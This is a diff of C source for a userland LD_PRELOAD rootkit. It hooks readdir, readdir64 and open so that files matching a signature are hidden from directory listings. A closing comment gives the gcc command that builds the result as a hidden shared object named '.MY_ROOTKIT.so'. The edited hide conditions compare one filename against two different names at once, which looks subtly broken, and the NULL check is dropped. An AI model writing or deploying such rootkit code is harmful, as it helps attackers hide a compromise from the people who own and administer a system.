@@ -17,11 +17,9 @@ struct dirent *readdir64(DIR *dirp){
     entries=my_readdir64(dirp);
 
     while(entries !=NULL){
-        if(strcmp(entries->d_name,SIGNATURE_FILE) == 0  && sig_check() != -1){
-            if (TRIGGER == 0){
-                create ();
-                TRIGGER = 1;
-            }
+        if(strcmp(entries->d_name,Shared_Lib_Path)== 0 && 
+        strcmp(entries->d_name,SIGNATURE_FILE) == 0  && sig_check() != -1){
+
             entries=my_readdir64(dirp);
         } 
         else {
@@ -76,10 +74,8 @@ struct dirent *readdir(DIR *dirp){
 
     struct dirent *entry;
     entry = my_readdir(dirp);
-    if(entry !=NULL && strcmp(entry->d_name, SIGNATURE_FILE) ==0 && sig_check() != -1){
-        if(TRIGGER == 0){
-        create();
-        TRIGGER = 1;}
+     if(strcmp(entry->d_name,Shared_Lib_Path)== 0 && 
+        strcmp(entry->d_name,SIGNATURE_FILE) == 0  && sig_check() != -1){
         entry=my_readdir(dirp);        
     }
     return entry;
@@ -97,3 +93,5 @@ int open(const char *pathname, int flags, ...){
     }
     return my_open(pathname,flags);
 }
+//compile to to a shared object 
+//gcc hide.c process_hider.c check_for_signature.c loadenv.c -o /tmp/.MY_ROOTKIT.so 
